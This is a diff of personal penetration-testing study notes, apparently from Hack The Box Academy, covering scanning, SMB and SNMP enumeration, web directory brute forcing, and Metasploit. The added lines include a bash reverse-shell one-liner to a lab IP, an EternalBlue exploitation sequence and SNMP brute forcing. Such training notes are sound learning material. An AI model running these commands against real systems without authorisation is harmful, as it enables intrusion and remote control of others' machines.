@@ -6,6 +6,7 @@ Lessons and Tutorials Covered
 * Linux Fundermentals (HTB Academy)
 * Metasploit (HTB Academy)
 * Nmap (HTB Academy)
+* Web Enumeration
 * Windows Fundermentals (HTB Academy)
 
 
@@ -95,6 +96,10 @@ We can now execute OS-level commands by adding a parameter to the GET request. i
 * System Info Commands
 > uname -a - shows OS version
 
+> ifconfig/ip a	- show our IP address
+
+> netstat -rn	- show networks accessible via the VPN
+
 > id - returns users id
 
 > ps -aux | grep ssh - check if a service is running
@@ -116,26 +121,38 @@ Git
 Download and install a package
 > dpkg -i strace_4.21-1ubuntu1_amd64.deb
 
+* Setup Reverse Shell
+> c -lvnp 1234	Start a nc listener on a local port
+> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Send a reverse shell from the remote server
 
 
-### Metasploit
 
-### install searchsploit
-sudo apt install exploitdb -y
-# scan for services 
-netcat 10.10.10.10 22
-nmap 10.129.42.253
-nmap -sV -sC -p- 10.129.42.253
-nc -nv 10.129.42.253 21
-nmap -sC -sV -p21 10.10.10.121
-#
-ftp -p 10.129.42.253
+## Metasploit
+* install searchsploit
+> sudo apt install exploitdb -y
+
+* scan for services 
+> netcat 10.10.10.10 22
+> nmap 10.129.42.253
+> nmap -sV -sC -p- 10.129.42.253
+> nc -nv 10.129.42.253 21
+> nmap -sC -sV -p21 10.10.10.121
+> ftp -p 10.129.42.253
 nmap -A -p445 10.129.42.253
 smbclient -N -L \\\\10.129.42.253
 smbclient -U bob \\\\10.129.42.253\\users
-# run scan on exploitable components 
-searchsploit openssh 7.2
-msfconsole
+* Run scan on exploitable components 
+> searchsploit openssh 7.2 - Search for public exploits for a web application
+* Using MSF Console
+Start the Metasploit Framework 
+> msfconsole
+> search exploit eternalblue	MSF: Search for public exploits in MSF
+> use exploit/windows/smb/ms17_010_psexec	MSF: Start using an MSF module
+> show options	MSF: Show required options for an MSF module
+> set RHOSTS 10.10.10.40	MSF: Set a value for an MSF module option
+> check	MSF: Test if the target server is vulnerable
+> exploit	MSF: Run the exploit on the target server is vulnerable
+
 
 
 
@@ -144,6 +161,22 @@ netstat -rn
 nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
 nmap -sS -sC -sV -Pn -p- -T4 -A host ip
 nmap -sV --script=smb* host ip
+
+netcat 10.10.10.10 22	Grab banner of an open port
+smbclient -N -L \\\\10.129.42.253	List SMB Shares
+smbclient \\\\10.129.42.253\\users	Connect to an SMB share
+snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	Scan SNMP on an IP
+onesixtyone -c dict.txt 10.129.42.254	Brute force SNMP secret string
+
+
+
+## Windows Fundermentals
+Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
+wmic os list brief - same as above
+
+xfreerdp /v:<targetIp> /u:htb-student /p:Password - RDP from unix
+
+Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl - list running services
 
 
 * list
@@ -176,17 +209,9 @@ netcat 10.10.10.10 22
 
 
 
-Windows Fundermentals
-Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
-wmic os list brief - same as above
 
-xfreerdp /v:<targetIp> /u:htb-student /p:Password - RDP from unix
 
-Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl - list running services
 
-metasploit
-sudo apt install exploitdb -y
-searchsploit openssh 7.2
 
 msfconsole
 search exploit eternalblue
@@ -207,7 +232,7 @@ smbclient \\\\10.129.42.253\\users 	Connect to an SMB share
 snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 	Scan SNMP on an IP
 onesixtyone -c dict.txt 10.129.42.254 	Brute force SNMP secret string
 
-Web Enumberatopn
+## Web Enumberatopn
 git clone https://github.com/danielmiessler/SecLists
 sudo apt install seclists -ysudo apt install seclists -y
 gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 	Run a directory scan on a website
